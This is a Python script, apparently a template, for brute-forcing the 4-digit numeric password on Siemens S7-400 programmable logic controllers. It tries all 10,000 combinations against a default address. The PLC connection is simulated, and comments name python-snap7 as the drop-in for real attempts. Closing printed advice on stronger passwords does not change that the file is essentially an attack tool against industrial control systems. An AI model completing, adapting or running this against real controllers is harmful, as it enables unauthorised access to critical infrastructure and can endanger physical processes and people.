#!/usr/bin/env python3
"""
S7-400 PLC Password Bruteforce
Brute forces a 4-digit numeric password on Siemens S7-400 PLCs.
"""

import sys
import time
from typing import Optional


# Simulated PLC class for demonstration
# In reality, you'd use a library like python-snap7
class SimulatedPLC:
    def __init__(self):
        self.actual_password = "0427"  # For simulation purposes
        self.connected = False

    @staticmethod
    def set_session_password(password: str) -> bool:
        """Set the password for the session."""
        # In real implementation, this would set password in PLC client library
        return True

    def connect(self, ip: str, rack: int, slot: int) -> bool:
        """Attempt connection with current password."""
        # Simulated connection logic - checks against hardcoded password
        # In real implementation, this would be actual PLC connection attempt
        current_password = getattr(self, '_current_password', None)
        if current_password == self.actual_password:
            self.connected = True
            return True
        return False


def brute_force_plc(plc_ip: str = '192.168.30.10',
                    rack: int = 0,
                    slot: int = 1,
                    max_attempts: int = 10000) -> Optional[str]:
    """
    Brute force a 4-digit numeric password on Siemens S7-400 PLC.

    Args:
        plc_ip: IP address of the PLC
        rack: Rack number
        slot: Slot number
        max_attempts: Maximum number of attempts (default: 10000 for 4 digits)

    Returns:
        The found password as string, or None if not found
    """
    print(f"[*] Starting brute force attack on {plc_ip}")
    print(f"[*] Testing all 4-digit combinations (0000-9999)")
    print(f"[*] Rack: {rack}, Slot: {slot}")
    print("-" * 50)

    start_time = time.time()
    attempts = 0

    # Initialize PLC connection object
    plc = SimulatedPLC()

    for password in range(0, max_attempts):
        try:
            password_str = str(password).zfill(4)

            # Set password for this attempt
            SimulatedPLC.set_session_password(password_str)

            # Store password for simulation (in real code, the library would handle this)
            plc._current_password = password_str

            # Attempt connection
            if plc.connect(plc_ip, rack, slot):
                elapsed = time.time() - start_time
                print(f"\n[+] Password found: {password_str}")
                print(f"[+] Attempts: {attempts + 1}")
                print(f"[+] Time elapsed: {elapsed:.2f} seconds")
                print(f"[+] Average speed: {(attempts + 1) / elapsed:.1f} attempts/second")
                return password_str

            attempts += 1

            # Progress indicator
            if attempts % 1000 == 0:
                print(f"[*] Tested {attempts} combinations...")

        except KeyboardInterrupt:
            print(f"\n[!] Interrupted by user after {attempts} attempts")
            return None
        except ConnectionError as e:
            # Handle specific network/connection errors
            print(f"[!] Connection error on attempt {attempts}: {e}")
            continue
        except TimeoutError as e:
            # Handle timeout errors specifically
            print(f"[!] Timeout on attempt {attempts}: {e}")
            continue
        except ValueError as e:
            # Handle value errors (e.g., invalid password format)
            print(f"[!] Value error on attempt {attempts}: {e}")
            continue
        except Exception as e:
            # Log unexpected errors but continue
            print(f"[!] Unexpected error on attempt {attempts}: {type(e).__name__}: {e}")
            continue

    elapsed = time.time() - start_time
    print(f"\n[-] Password not found after {attempts} attempts")
    print(f"[-] Time elapsed: {elapsed:.2f} seconds")
    return None


if __name__ == "__main__":
    # Example usage with command line arguments
    import argparse

    parser = argparse.ArgumentParser(
        description="Brute force 4-digit password on Siemens S7-400 PLC"
    )
    parser.add_argument("--ip", default="192.168.30.10", help="PLC IP address")
    parser.add_argument("--rack", type=int, default=0, help="Rack number")
    parser.add_argument("--slot", type=int, default=1, help="Slot number")
    parser.add_argument("--timeout", type=float, default=1.0,
                        help="Connection timeout in seconds (simulation)")

    args = parser.parse_args()

    password = brute_force_plc(args.ip, args.rack, args.slot)

    if password:
        print(f"\n[!] SECURITY WARNING: Using 4-digit passwords on critical infrastructure is insecure!")
        print(f"[!] Recommendations:")
        print(f"    1. Use longer, complex passwords (8+ characters)")
        print(f"    2. Implement account lockout policies")
        print(f"    3. Use network segmentation and firewalls")
        print(f"    4. Enable PLC access logging")
        print(f"    5. Consider using S7-1500 with enhanced security features")
    else:
        sys.exit(1)
